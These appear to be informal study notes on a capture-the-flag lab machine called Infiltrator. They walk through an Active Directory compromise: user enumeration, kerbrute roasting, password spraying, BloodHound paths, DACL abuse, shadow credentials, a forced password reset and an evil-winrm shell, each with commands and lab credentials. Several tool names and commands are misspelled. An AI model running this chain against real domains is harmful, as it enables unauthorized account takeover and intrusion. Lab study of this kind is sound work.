
# enum

- nmap -sC -sV -oA  -vv  nmap/forest 10.10.10.1
- main added the fully qualifyide doamain to hosts file 
- 10.10.10.1 dc01.infiltrator.htb infiltrator.htb dc01

skip some enum like normally i would run netexec looking if there is open shares
looking the static website it has there is employee section of and there names we gonna take that employee names and put it into a file for potential_users.txt

he used fancia way to take the h4 in the website 
- `curl -s -q 10.10.10.1 | rep -oP 'h4>.[0-9]* \K(.*?)(?=h)'`
-  `username-anarchy -i potential_users.txt` 


## kerbrute 
we have potential users and this will tell you if your users some of them are valid users and if there is a pre-auth users and it will dump it's hashes for you and you can crack that using hashcat
- `kerbrute usernum --dc 10.10.10.1 -d infilitrator.htb potential_users.txt`
- if the hash is $18 hashcat can't crack it so make it downgrade 
- `kerbrute usernum --dc 10.10.10.1 -d infilitrator.htb --downgrade potential_users.txt`
- and if hash is 23 you can crack it 
##  hashcat
it cracked the hash and we put the password and user 

## NXC 
to see all the users 
- `nxc smb 10.10.10.1 -u l.clark -p whatismypass! --users`
- (sometimes change the ip to hostname = dc01.infiltrator.htb)
- finded  a password of k.turner

## password spraying 
we gonna put password we have into a file and users we have into a file and we gonna pass or try the passwords to as many account as possible 
- `nxc smb 10.10.10.1 -u l.clark -p users.txt -p passwords.txt`
- we gonna use passsword spraying again and specifiy kerboros this time if there is protected account then you have to use kerb to login let as try to get hints if user login as then says like failed we own that user ?
- `nxc smb 10.10.10.1 -k -u l.clark -p whatismypass! --continue-on-success`
- and we mark the user account that the password of clark login with as owned in bloodhound which is d.andreson and we have two owned in bloodhound 
- if d.andreson i login like this `nxc smb 10.10.10.1 -u d.andreson -p users.txt -p whatismypass!` i get status account restriction because ntlm login is disbaled and if  i do provide -k telling to do kerbos login and now it says secuss if it says preuath failed check password if it's correct
- `nxc smb 10.10.10.1 -k -u d.andreson -p whatismypass! --continue-on-success`
- 

## rusthound-ce 
it will capture all cert info , you can't do pass the hash attacker but you can use kerboros and i think you can work with just ntlm hash but all that is irrelavant because we don't need to use ntlm hash because we have a password
- `rustbound-ce -d infiltrator.htb -u l.clark -p whatismypass!`
- we have bloodhound data on this top command which generated json

## bloodhound
- `cd /opt/bloodhound/server`
- `docker compose up -d`
- go to localhost:8088 and you can see bloodhound login to it if you forget delete the neo4j auth file and it will say login with new pass
- upload data you got from rusthound
- and search user that we have and mark him as owned and go to cypher queries 
- `choose short path to systems for unencrypted delegation ` ==query we clicked==
- lan managmeent account is high value because it ca readGMSApasswords (find way to get there)
- infiltrator-srv account can perform ADCSEXPLOITN4 ovver to domain  that is potentioal priv esclation 
- `shortest path from owned objects ` ==query we clicked== (were l.clark is member of )
- we add d.andreson to owned and see shortest path from owned objects agaim
-  two owned in bloodhound and we have attack chain 
- choose path of orange+green 
- not yellow + yellow (nothing there)
- ``andreson has genericall on marketdigital OU and that contains e-rogrigez user who can add himself to cheif -marketing OU which then has force change password on m.harris ``
- 1. d.adndreson to take control of OU
- 2. create shadow creds for e.rodrigez
- 3. add ourselves to market group 
- 4 . force m.harris to change password

## dacledit.py 
**ACL abuse / Rights modification**  
Edits DACLs on AD objects to grant extra rights (e.g., `GenericAll`).
andreson to take control of marketdigital OU (giving us full control and inherit child objects)
this tool does is granting access like fullcontrol to principals (like users,groups, etc) and this time we giving it to user on a target object
- dacedit.py -action write -rights FullControl -inheritance -principal d.anderson -target-dn="OU NAME" -k  -dc-ip infiltrator.htb 'infiltrator.htb/d.andreson:whatismypass!'

## certipy
**AD CS abuse (ESC1–ESC8 attacks)**  
Exploits vulnerable certificate templates to escalate privileges
it gonna give us shadow credentials
- certipy shadow auto -k -target dc01.infiltrator.htb -u d.andreson@infiltrator.htb -p "whatismypass!" -account e.rodrigez
- copy the hash of e.rodrigez
- 

## bloodyAD
add ourself (rodrigez) to marketing group 
- `bloodyAD -u e.rodrigez -p ':<hash>' --host dc01.infiltrator.htb -d infiltartor.htb add groupMember "<Group name that your adding yourself>" -e.rodrigez`
- when he is added we can setup a password or changed m.harris password
- `bloodyAD -u e.rodrigez -p ':<hash>' --host dc01.infiltrator.htb -d infiltartor.htb set password m.harris "password!"

## getTGP.py
created a ticket for mharris
- `getTGT 'infiltrator.htb/m.harris:password!' `
- and then save the ticket (we have ticket )
- now set m.harris to owned in bloodhoud

==m.harris is in remote management OU he is member there this means we can use EVIL-WINRM==

to use evil-winrm he said we ill fix up our keybros config on our computer 
- nxc smb infiltrator.htb --generate-krb5-file infiltartor-krb.conf
- sudo cp infiltrator-krb.conf /etc/krb5.conf
- now i should be able to use evil-winrm

## evil-winrm 
this KRB5CCNAME=M.harris.ccache (is the file , ticket that GETTGT created)
- KRB5CCNAME=m.harris evil-winrm  -i dc01.infiltrator.htb -r infiltrator.htb
- then we have a shell on m.harris
- run whoami /all if there was some big prevligee we have we could have seen it in bloodhound